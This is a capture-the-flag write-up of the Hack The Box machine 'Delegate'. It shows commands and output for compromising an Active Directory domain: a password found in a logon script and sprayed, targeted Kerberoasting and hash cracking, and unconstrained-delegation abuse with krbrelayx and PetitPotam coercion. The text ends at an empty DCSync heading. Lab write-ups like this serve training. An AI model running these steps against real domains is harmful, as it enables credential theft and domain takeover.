---
layout: posts
title: "HTB — Delegate Writeup"
date: 2026-03-01
tags: [htb, writeup, windows, active directory]
categories: [ctf]
---

## Overview

- **Machine:** Delegate
- **Platform:** Hack The Box
- **OS:** Windows
- **Difficulty:** Medium

Delegate is a medium-difficulty Active Directory machine that blends misconfigurations with delegation abuse for lateral movement and privilege escalation. It’s a fun and practical way to strengthen your understanding of Kerberos, SPNs, and core AD attack paths.

---

## Initial enumeration

### Nmap scan

```bash
map scan report for 10.129.1.41
Host is up (0.031s latency).
Not shown: 65508 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-28 15:16:41Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC1.delegate.vl
| Not valid before: 2026-02-27T15:12:56
|_Not valid after:  2026-08-29T15:12:56
|_ssl-date: 2026-02-28T15:18:16+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: DELEGATE
|   NetBIOS_Domain_Name: DELEGATE
|   NetBIOS_Computer_Name: DC1
|   DNS_Domain_Name: delegate.vl
|   DNS_Computer_Name: DC1.delegate.vl
|   DNS_Tree_Name: delegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-02-28T15:17:37+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
51770/tcp open  msrpc         Microsoft Windows RPC
53257/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
53258/tcp open  msrpc         Microsoft Windows RPC
53263/tcp open  msrpc         Microsoft Windows RPC
53275/tcp open  msrpc         Microsoft Windows RPC
54780/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-02-28T15:17:37
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

As it is common with active directory machines, we have our typical domain related ports open, including LDAPS, SMB, RPC, etc... I'll run a scan with enum4linux too.

### Enum4linux

```bash
┌──(kali㉿kali)-[~/hackthebox/delegate]
└─$ enum4linux-ng 10.129.234.69                              
ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.129.234.69
[*] Username ......... ''
[*] Random Username .. 'xnailsqk'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ======================================
|    Listener Scan on 10.129.234.69    |
 ======================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =====================================================
|    Domain Information via LDAP for 10.129.234.69    |
 =====================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: delegate.vl

 ============================================================
|    NetBIOS Names and Workgroup/Domain for 10.129.234.69    |
 ============================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ==========================================
|    SMB Dialect Check on 10.129.234.69    |
 ==========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:                                                                                                                                                                                                                         
  SMB 1.0: false                                                                                                                                                                                                                            
  SMB 2.02: true                                                                                                                                                                                                                            
  SMB 2.1: true                                                                                                                                                                                                                             
  SMB 3.0: true                                                                                                                                                                                                                             
  SMB 3.1.1: true                                                                                                                                                                                                                           
Preferred dialect: SMB 3.0                                                                                                                                                                                                                  
SMB1 only: false                                                                                                                                                                                                                            
SMB signing required: true                                                                                                                                                                                                                  

 ============================================================
|    Domain Information via SMB session for 10.129.234.69    |
 ============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC1                                                                                                                                                                                                                  
NetBIOS domain name: DELEGATE                                                                                                                                                                                                               
DNS domain: delegate.vl                                                                                                                                                                                                                     
FQDN: DC1.delegate.vl                                                                                                                                                                                                                       
Derived membership: domain member                                                                                                                                                                                                           
Derived domain: DELEGATE                                                                                                                                                                                                                    

 ==========================================
|    RPC Session Check on 10.129.234.69    |
 ==========================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user
[+] Server allows session using username 'xnailsqk', password ''
[H] Rerunning enumeration with user 'xnailsqk' might give more results

 ====================================================
|    Domain Information via RPC for 10.129.234.69    |
 ====================================================
[+] Domain: DELEGATE
[+] Domain SID: S-1-5-21-1484473093-3449528695-2030935120
[+] Membership: domain member

 ================================================
|    OS Information via RPC for 10.129.234.69    |
 ================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016                                                                                                                                                                                    
OS version: '10.0'                                                                                                                                                                                                                          
OS release: ''                                                                                                                                                                                                                              
OS build: '20348'                                                                                                                                                                                                                           
Native OS: not supported                                                                                                                                                                                                                    
Native LAN manager: not supported                                                                                                                                                                                                           
Platform id: null                                                                                                                                                                                                                           
Server type: null                                                                                                                                                                                                                           
Server type string: null                                                                                                                                                                                                                    

 ======================================
|    Users via RPC on 10.129.234.69    |
 ======================================
[*] Enumerating users via 'querydispinfo'
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[*] Enumerating users via 'enumdomusers'
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED

 =======================================
|    Groups via RPC on 10.129.234.69    |
 =======================================
[*] Enumerating local groups
[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED
[*] Enumerating builtin groups
[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED
[*] Enumerating domain groups
[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED

 =======================================
|    Shares via RPC on 10.129.234.69    |
 =======================================
[*] Enumerating shares
[+] Found 0 share(s) for user '' with password '', try a different user

 ==========================================
|    Policies via RPC for 10.129.234.69    |
 ==========================================
[*] Trying port 445/tcp
[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED
[*] Trying port 139/tcp
[-] SMB connection error on port 139/tcp: session failed

 ==========================================
|    Printers via RPC for 10.129.234.69    |
 ==========================================
[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED

Completed after 10.37 seconds
```
I'll take note of the SID and add the domain to my /etc/hosts.

Since we don't have any kind of web service, I'll proceed with SMB and test for Null and Guest credentials.

```bash
┌──(kali㉿kali)-[~/hackthebox/delegate]
└─$ smbclient -N -L //delegate.vl                                     

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to delegate.vl failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/hackthebox/delegate]
└─$ smbclient -U 'Guest' -L //delegate.vl
Password for [WORKGROUP\Guest]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to delegate.vl failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
Looks like we have access as both. I'll list the readables shares with nxc.

```bash
┌──(kali㉿kali)-[~/hackthebox/delegate]
└─$ nxc smb delegate.vl -u 'Guest' -p '' --shares
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\Guest: 
SMB         10.129.234.69   445    DC1              [*] Enumerated shares
SMB         10.129.234.69   445    DC1              Share           Permissions     Remark
SMB         10.129.234.69   445    DC1              -----           -----------     ------
SMB         10.129.234.69   445    DC1              ADMIN$                          Remote Admin
SMB         10.129.234.69   445    DC1              C$                              Default share
SMB         10.129.234.69   445    DC1              IPC$            READ            Remote IPC
SMB         10.129.234.69   445    DC1              NETLOGON        READ            Logon server share 
SMB         10.129.234.69   445    DC1              SYSVOL          READ            Logon server share
```

Nothing out of the ordinary. If necessary, I'll come back and check the `Netlogon` and `Sysvol` shares.

### Failed ASREP Roast

Since we have authenticated access as Guest, we can attempt user enumeration and check for accounts configured without Kerberos preauthentication (ASREP roastable users). This is called [ASREPRoast](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/asreproast.html)

```bash
┌──(kali㉿kali)-[~/hackthebox/delegate]
└─$ impacket-lookupsid Guest@delegate.vl                                                                                       
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Brute forcing SIDs at delegate.vl
[*] StringBinding ncacn_np:delegate.vl[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1484473093-3449528695-2030935120
498: DELEGATE\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: DELEGATE\Administrator (SidTypeUser)
501: DELEGATE\Guest (SidTypeUser)
502: DELEGATE\krbtgt (SidTypeUser)
512: DELEGATE\Domain Admins (SidTypeGroup)
513: DELEGATE\Domain Users (SidTypeGroup)
514: DELEGATE\Domain Guests (SidTypeGroup)
515: DELEGATE\Domain Computers (SidTypeGroup)
516: DELEGATE\Domain Controllers (SidTypeGroup)
517: DELEGATE\Cert Publishers (SidTypeAlias)
518: DELEGATE\Schema Admins (SidTypeGroup)
519: DELEGATE\Enterprise Admins (SidTypeGroup)
520: DELEGATE\Group Policy Creator Owners (SidTypeGroup)
521: DELEGATE\Read-only Domain Controllers (SidTypeGroup)
522: DELEGATE\Cloneable Domain Controllers (SidTypeGroup)
525: DELEGATE\Protected Users (SidTypeGroup)
526: DELEGATE\Key Admins (SidTypeGroup)
527: DELEGATE\Enterprise Key Admins (SidTypeGroup)
553: DELEGATE\RAS and IAS Servers (SidTypeAlias)
571: DELEGATE\Allowed RODC Password Replication Group (SidTypeAlias)
572: DELEGATE\Denied RODC Password Replication Group (SidTypeAlias)
1000: DELEGATE\DC1$ (SidTypeUser)
1101: DELEGATE\DnsAdmins (SidTypeAlias)
1102: DELEGATE\DnsUpdateProxy (SidTypeGroup)
1104: DELEGATE\A.Briggs (SidTypeUser)
1105: DELEGATE\b.Brown (SidTypeUser)
1106: DELEGATE\R.Cooper (SidTypeUser)
1107: DELEGATE\J.Roberts (SidTypeUser)
1108: DELEGATE\N.Thompson (SidTypeUser)
1121: DELEGATE\delegation admins (SidTypeGroup)
```

With this, we will get groups and users inside the domain. Now I'll direct the output to a list and parse the usernames using awk.

```bash
┌──(kali㉿kali)-[~/hackthebox/delegate]
└─$ awk -F'\\\\' '/SidTypeUser/ {print $2}' lookupsid.txt | awk '{print $1}' > users.txt
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/hackthebox/delegate]
└─$ cat users.txt 
Administrator
Guest
krbtgt
DC1$
A.Briggs
b.Brown
R.Cooper
J.Roberts
N.Thompson
```

To perform an ASREP Roast, I'll use impacket `GetNPUsers` tool.

```bash
┌──(kali㉿kali)-[~/hackthebox/delegate]
└─$ impacket-GetNPUsers delegate.vl/ -usersfile users.txt -dc-ip 10.129.234.69 -dc-host DC1.delegate.vl -no-pass -request
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User A.Briggs doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User b.Brown doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User R.Cooper doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User J.Roberts doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User N.Thompson doesn't have UF_DONT_REQUIRE_PREAUTH set
```

No luck.

Now that we have a list of valid domain users, we have two main options. We can try a targeted password spray using common patterns like `username = password` or simple variations — something that still happens more often than expected. This approach is safer than brute forcing and helps avoid account lockouts.

Alternatively, before trying passwords, it’s worth checking SMB again for any readable shares or misconfigurations. Folders like SYSVOL, NETLOGON, or backup directories sometimes contain useful files, scripts, or even credentials. It’s usually a good idea to exhaust basic enumeration before moving into authentication attacks.

I'll move to SMB first.

## Initial Foothold

### Port 445

Upon loging inside `NETLOGON`, I got a non default file named `users.bat`. I'll transfer it to my kali to analyze.

```bash
┌──(kali㉿kali)-[~/hackthebox/delegate]
└─$ smbclient -U 'Guest' //delegate.vl/netlogon
Password for [WORKGROUP\Guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Aug 26 08:45:24 2023
  ..                                  D        0  Sat Aug 26 05:45:45 2023
  users.bat                           A      159  Sat Aug 26 08:54:29 2023

                4652287 blocks of size 4096. 1118894 blocks available
smb: \> mget users.bat
Get file users.bat? 
smb: \> exit
```

```bash
┌──(kali㉿kali)-[~/hackthebox/delegate]
└─$ cat users.bat                              
rem @echo off
net use * /delete /y
net use v: \\dc1\development 

if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator P4ssw0rd1#123
```

We've got a password. Luckily, we already made a users list, now we just have to spray the password. I'll use nxc for this.

```bash
┌──(kali㉿kali)-[~/hackthebox/delegate]
└─$ nxc smb delegate.vl -u users.txt -p 'P4ssw0rd1#123' --continue-on-success
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.69   445    DC1              [-] delegate.vl\Administrator:P4ssw0rd1#123 STATUS_LOGON_FAILURE 
SMB         10.129.234.69   445    DC1              [-] delegate.vl\Guest:P4ssw0rd1#123 STATUS_LOGON_FAILURE 
SMB         10.129.234.69   445    DC1              [-] delegate.vl\krbtgt:P4ssw0rd1#123 STATUS_LOGON_FAILURE 
SMB         10.129.234.69   445    DC1              [-] delegate.vl\DC1$:P4ssw0rd1#123 STATUS_LOGON_FAILURE 
SMB         10.129.234.69   445    DC1              [+] delegate.vl\A.Briggs:P4ssw0rd1#123 
SMB         10.129.234.69   445    DC1              [-] delegate.vl\b.Brown:P4ssw0rd1#123 STATUS_LOGON_FAILURE 
SMB         10.129.234.69   445    DC1              [-] delegate.vl\R.Cooper:P4ssw0rd1#123 STATUS_LOGON_FAILURE 
SMB         10.129.234.69   445    DC1              [-] delegate.vl\J.Roberts:P4ssw0rd1#123 STATUS_LOGON_FAILURE 
SMB         10.129.234.69   445    DC1              [-] delegate.vl\N.Thompson:P4ssw0rd1#123 STATUS_LOGON_FAILURE
```
I got a match with A.Briggs, I'll proceed with bloodhound for further enumeration and lateral movement.

### Shell as N.Thompson

## Bloodhound

I'll use bloodhound-python to collect the data remotely.

```bash
┌──(kali㉿kali)-[~/hackthebox/delegate]
└─$ bloodhound-python -c all,Group,Session,DCOM,RDP,PSRemote,LoggedOn,Container,ObjectProps,ACL -d "delegate.vl" -ns 10.129.1.41 -v -u A.Briggs -p 'P4ssw0rd1#123'
```

<p align="center">
  <a href="/assets/images/delegate/captura1.png" class="glightbox">
    <img src="/assets/images/delegate/captura1.png" width="700">
  </a>
</p>

We're not part of any interesting groups, however, bloodhound shows us we have `GenericWrite` over another user `N.Thompson`.

<p align="center">
  <a href="/assets/images/delegate/captura2.png" class="glightbox">
    <img src="/assets/images/delegate/captura2.png" width="700">
  </a>
</p>

This means that we can modify this object and change its attributes. To abuse this, we can add a SPN to the user, request a TGS and crack it with hashcat. To automate it, we can use the tool [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)

```bash
┌──(kali㉿kali)-[~/hackthebox/delegate]
└─$ ./targetedKerberoast.py --dc-ip '10.129.234.69' -v -d 'delegate.vl' -u 'A.Briggs' -p 'P4ssw0rd1#123'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (N.Thompson)
[+] Printing hash for (N.Thompson)
$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$af27ea2d336480f81308a8b86f673b8c$.....
[VERBOSE] SPN removed successfully for (N.Thompson)
```

```powershell
PS Z:\escritorio-14-02.-26\hashcat> .\hashcat.exe .\Place_your_hashes_here.txt .\rockyou.txt --force --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$6ef4fdebcafc2e4c867f59d7c27d87a0$1b73aaa8aa96d347ef023b3a20b721......9df2fb0c98c7d61086f1e0a87f78c7839c137259a6960101414e533dc:KALEB_2341
````
The hash cracks easily and now we have credentials for N.Thompson.

<p align="center">
  <a href="/assets/images/delegate/captura3.png" class="glightbox">
    <img src="/assets/images/delegate/captura3.png" width="700">
  </a>
</p>

Bloodhound shows that N.Thompson is part of the `Remote Management Users`. This means we can get a shell and our user.txt is in Desktop.

```bash
┌──(kali㉿kali)-[~/hackthebox/delegate]
└─$ evil-winrm -i delegate.vl -u 'N.Thompson' -p 'KALEB_2341'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> cd ..
*Evil-WinRM* PS C:\Users\N.Thompson> cd Desktop
*Evil-WinRM* PS C:\Users\N.Thompson\Desktop> ls


    Directory: C:\Users\N.Thompson\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---          3/1/2026   6:30 AM             34 user.txt


*Evil-WinRM* PS C:\Users\N.Thompson\Desktop> 
```

## Privilege Escalation

### More enumeration

Starting to enumerate permissions on N.Thompson, I can already see something interesting in `whoami /all`.

```bash
*Evil-WinRM* PS C:\Users\N.Thompson\Desktop> whoami /all

USER INFORMATION
----------------

User Name           SID
=================== ==============================================
delegate\n.thompson S-1-5-21-1484473093-3449528695-2030935120-1108


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
DELEGATE\delegation admins                  Group            S-1-5-21-1484473093-3449528695-2030935120-1121 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

### SeEnableDelegation abuse

SeEnableDelegationPrivilege is a sensitive Active Directory privilege that allows an account to configure other AD objects to be trusted for Kerberos delegation. In simple terms, it lets you decide which accounts are allowed to impersonate other users.

There are three types of delegation out there:

- Contrained delegation: A machine can impersonate users, but only to specific services that are explicitly allowed. This limits what it can access and reduces risk.
- Unconstrained delegation: The most dangerous type. A machine configured for unconstrained delegation can impersonate any user to any service. If a privileged user (like a Domain Admin) authenticates to that machine, their Kerberos ticket can potentially be abused.
- Resource-Based Constrained delegation: Instead of configuring delegation on the impersonating machine, the target service decides which accounts are allowed to delegate to it.

Impacket's findDelegation tells us that DC1$ has Unconstrained type.

```bash
  ┌──(kali㉿kali)-[~/hackthebox/delegate]
└─$ impacket-findDelegation "delegate.vl"/"N.Thompson":"KALEB_2341"           
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

AccountName  AccountType  DelegationType  DelegationRightsTo  SPN Exists 
-----------  -----------  --------------  ------------------  ----------
DC1$         Computer     Unconstrained   N/A                 Yes        

```

The idea behind abusing unconstrained delegation is to obtain a Kerberos TGT from a privileged user within the domain. To achieve this, we create a machine account in the domain and configure it for unconstrained delegation. We then add a DNS record pointing to our attacker-controlled host and assign it a valid SPN so that Kerberos authentication can occur.

Next, we coerce a privileged machine (such as a Domain Controller) to authenticate to our fabricated machine. Because it is configured for unconstrained delegation, the Kerberos TGT of the authenticating account will be forwarded and cached on our system. We can then extract that ticket and use it to impersonate the privileged user.
To make it clearer, we'll follow the path I just marked with orange lines in this diagram. We're starting with the machine path because our idea is to create a fresh machine.

It is worth nothing that I tried to perform this attack locally inside the machine, but it has an antivirus set.

<p align="center">
  <a href="/assets/images/delegate/captura4.png" class="glightbox">
    <img src="/assets/images/delegate/captura4.png" width="700">
  </a>
</p>

First, we'll start by creating the machine, we can use impacket's addcomputer for this.

```bash
┌──(kali㉿kali)-[~/hackthebox/delegate]
└─$ impacket-addcomputer -computer-name testpc -computer-pass 'pass00**' -dc-ip 10.129.234.69 delegate.vl/N.Thompson:'KALEB_2341'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account testpc$ with password pass00**.
```

Next, we'll add a DNS record that points to our IP. We'll use the tools in [krbrelayx](https://github.com/dirkjanm/krbrelayx). Dnstool to add the DNS record.

```bash
┌──(kali㉿kali)-[~/hackthebox/delegate/krbrelayx]
└─$ python dnstool.py -u 'delegate.vl\testpc$' -p 'pass00**'  --action add --record testpc.delegate.vl --type A --data 10.10.14.25 -dns-ip 10.129.234.69 DC1.delegate.vl
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

After this, I'll add the SPN with addspn.

```bash
┌──(kali㉿kali)-[~/hackthebox/delegate/krbrelayx]
└─$ python addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/testpc' --target 'testpc$' -dc-ip 10.129.234.69 dc1.delegate.vl                           
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

Following this [post](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/unconstrained-delegation.html), we also have to give unconstrained delegation to the new machine.

```bash
┌──(kali㉿kali)-[~/hackthebox/delegate/krbrelayx]
└─$ bloodyAD -d delegate.vl -u N.Thompson -p KALEB_2341 --host dc1.delegate.vl add uac 'testpc$' -f TRUSTED_FOR_DELEGATION    
[-] ['TRUSTED_FOR_DELEGATION'] property flags added to testpc$'s userAccountControl
```

To set krbrelayx up, we'll need the NT hash of the new machine. We can compute this with a very simple python code.

```bash
┌──(kali㉿kali)-[~/hackthebox/delegate/krbrelayx]
└─$ python3 - << 'PY'
password = 'pass00**' 
import hashlib
print(hashlib.new('md4', password.encode('utf-16le')).hexdigest())
PY
d32616c7b926dfe07cb016555c0730cb
```

And start krbrelayx.

```bash
┌──(kali㉿kali)-[~/hackthebox/delegate/krbrelayx]
└─$ python krbrelayx.py -hashes :d32616c7b926dfe07cb016555c0730cb                                                                        
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMB loaded..
[*] Running in export mode (all tickets will be saved to disk). Works with unconstrained delegation attack only.
[*] Running in unconstrained delegation abuse mode using the specified credentials.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server

[*] Servers started, waiting for connections
```

Now, to coerce authentication, we can use a lot of methods, such as PrinterBug or PetitPotam. I used nxc in the beginning for this, but it didn't seem to work.

```bash
┌──(kali㉿kali)-[~/hackthebox/delegate/krbrelayx/PetitPotam]
└─$ netexec smb dc1.delegate.vl -u 'testpc$' -p 'pass00**' -M coerce_plus -o LISTENER=testpc.delegate.vl METHOD=PetitPotam
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                                        
SMB         10.129.234.69   445    DC1              [+] delegate.vl\testpc$:pass00** 
COERCE_PLUS 10.129.234.69   445    DC1              VULNERABLE, PetitPotam
COERCE_PLUS 10.129.234.69   445    DC1              Exploit Success, efsrpc\EfsRpcAddUsersToFile
```

```bash
┌──(kali㉿kali)-[~/hackthebox/delegate/krbrelayx]
└─$ python krbrelayx.py -hashes :d32616c7b926dfe07cb016555c0730cb                        
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMB loaded..
[*] Running in export mode (all tickets will be saved to disk). Works with unconstrained 
[*] Running in unconstrained delegation abuse mode using the specified credentials.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server

[*] Servers started, waiting for connections
[*] SMBD: Received connection from 10.129.234.69
[*] SMBD: Received connection from 10.129.234.69
[*] SMBD: Received connection from 10.129.234.69
[*] SMBD: Received connection from 10.129.234.69
```

I could receive a connection but no ticket. I got my ticket when I changed to [PetitPotam](https://github.com/topotam/PetitPotam) PoC of topotam.

```bash
┌──(kali㉿kali)-[~/hackthebox/delegate/krbrelayx/PetitPotam]
└─$ python PetitPotam.py -target-ip 10.129.234.69 -u 'testpc$' -p 'pass00**' testpc dc1.delegate.vl
                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Trying pipe lsarpc
[-] Connecting to ncacn_np:dc1.delegate.vl[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

```bash
[*] SMBD: Received connection from 10.129.234.69
[*] SMBD: Received connection from 10.129.234.69
[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]
[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
[*] SMBD: Received connection from 10.129.234.69
[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]
[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
```

### DCSync attack

